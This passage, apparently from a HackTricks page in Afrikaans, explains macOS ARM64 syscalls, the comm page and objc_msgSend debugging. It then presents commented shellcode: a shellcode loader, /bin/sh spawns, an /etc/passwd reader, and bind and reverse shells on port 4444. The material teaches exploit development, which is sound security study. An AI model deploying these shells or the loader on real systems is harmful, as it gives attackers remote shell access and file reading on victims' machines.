> Soms is dit makliker om die **decompiled** kode van **`libsystem_kernel.dylib`** na te gaan **as** om die **source code** na te gaan, omdat die kode van verskeie syscalls (BSD en Mach) deur scripts gegenereer word (kyk na die kommentare in die source code), terwyl jy in die dylib kan sien wat geroep word.

### machdep calls

XNU ondersteun nog ’n tipe calls genaamd machine dependent. Die nommers van hierdie calls hang van die argitektuur af, en nóg die calls nóg die nommers word gewaarborg om konstant te bly.

### comm page

Dit is ’n kernel-owned geheuebladsy wat in die address space van elke gebruiker se proses gemap word. Dit is bedoel om die oorgang van user mode na kernel space vinniger te maak as om syscalls te gebruik vir kernel-dienste wat so gereeld gebruik word dat hierdie oorgang andersins baie ondoeltreffend sou wees.

Byvoorbeeld, die call `gettimeofdate` lees die waarde van `timeval` direk vanaf die comm page.

### objc_msgSend

Dit is baie algemeen om hierdie funksie in Objective-C- of Swift-programme te vind. Hierdie funksie laat jou toe om ’n metode van ’n Objective-C-objek te roep.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer na die instansie
- x1: op -> Selector van die metode
- x2... -> Die res van die argumente van die geroepte metode

As jy dus ’n breakpoint voor die branch na hierdie funksie plaas, kan jy maklik in lldb sien wat geroep word (in hierdie voorbeeld roep die objek ’n objek van `NSConcreteTask` aan wat ’n command sal uitvoer):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Deur die env variable **`NSObjCMessageLoggingEnabled=1`** te stel, is dit moontlik om aan te teken wanneer hierdie funksie in ’n lêer soos `/tmp/msgSends-pid` geroep word.
>
> Verder, deur **`OBJC_HELP=1`** te stel en enige binary te roep, kan jy ander environment variables sien wat jy kan gebruik om aan te teken wanneer sekere Objc-C-aksies plaasvind.

Wanneer hierdie funksie geroep word, moet die geroepe metode van die aangeduide instance gevind word. Hiervoor word verskeie searches uitgevoer:

- Voer optimistic cache lookup uit:
- Indien suksesvol, klaar
- Verkry runtimeLock (read)
- Indien (realize && !cls->realized), realize class
- Indien (initialize && !cls->initialized), initialize class
- Probeer die class se eie cache:
- Indien suksesvol, klaar
- Probeer die class method list:
- Indien gevind, vul cache en klaar
- Probeer superclass cache:
- Indien suksesvol, klaar
- Probeer superclass method list:
- Indien gevind, vul cache en klaar
- Indien (resolver), probeer method resolver, en herhaal vanaf class lookup
- Indien steeds hier (= alles anders het misluk), probeer forwarder

### Shellcodes

Om te compileer:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Om die grepe te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Vir nuwer macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C-kode om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Geneem van [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lees met cat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus is die tweede argument (x1) ’n skikking van parameters (wat in die geheue ’n stapel van die adresse beteken).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Voer opdrag met sh vanuit ’n fork uit sodat die hoofproses nie beëindig word nie
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell vanaf [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) op **poort 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Vanaf [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Verwysings

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
